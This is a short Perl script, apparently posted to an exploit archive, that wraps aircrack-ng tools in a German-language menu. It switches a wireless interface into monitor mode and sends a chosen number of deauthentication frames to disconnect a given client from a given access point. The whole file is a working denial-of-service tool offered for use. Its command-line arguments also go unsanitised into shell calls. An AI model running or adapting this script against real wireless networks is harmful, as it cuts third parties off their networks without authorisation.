#!usr/bin/perl
# Wlan - Deauther <= 1.0.1
# Discovered by: Neo2k8
# VXnet.biz
########################################################
#
# Only for Linux with Aircrack-ng
#
# Tested on Backtrack 2 Final , Backtrack 3 Beta
#
########################################################
if (@ARGV < 4)
{
print<<EOF;
\n\n
 __    __ _                     ___                 _   _               
/ / /\ \ \ | __ _ _ __         /   \___  __ _ _   _| |_| |__   ___ _ __ 
\ \/  \/ / |/ _` | '_ \ _____ / /\ / _ \/ _` | | | | __| '_ \ / _ \ '__|
 \  /\  /| | (_| | | | |_____/ /_//  __/ (_| | |_| | |_| | | |  __/ |   
  \/  \/ |_|\__,_|_| |_|    /___,' \___|\__,_|\__,_|\__|_| |_|\___|_|   
                                                                        
					coded by Neo2k8
Usage : 
perl Wlan-Deauther.pl <channel> <mac from ap> <mac from client> <interface>


EOF
exit;
} 

$channel = $ARGV[0];
$apmac= $ARGV[1];
$cmac= $ARGV[2];
$interface = $ARGV[3];
&loop;

sub loop {
system("clear");
print "\n\n","Bitte waehlen Sie","\n";
print "--------------------------","\n";
print "[1] Wlan-Deauther starten","\n";
print "[2] Beenden","\n";
chomp($eingabe=<STDIN>);

if ($eingabe =~ 1)
{
&start;
}
elsif ($eingabe =~ 2)
{
exit;
}
else
{
&loop;
}
}

sub start
{
system("clear");
print "Wie viele deauth ? : ";
chomp($eingabe2=<STDIN>);
system("clear");
print "[~] Starte Attacke";
system("ifconfig $interface down");
sleep 3;
system("ifconfig $interface up");
sleep 3;
system("airmon-ng stop $interface");
sleep 1;
system("airmon-ng start $interface $channel");
sleep 3;
system("clear");
system("aireplay-ng -0 $eingabe2 -a $apmac -c $cmac $interface");
system("clear");
print "[~] Done!\n\n";
exit;
}

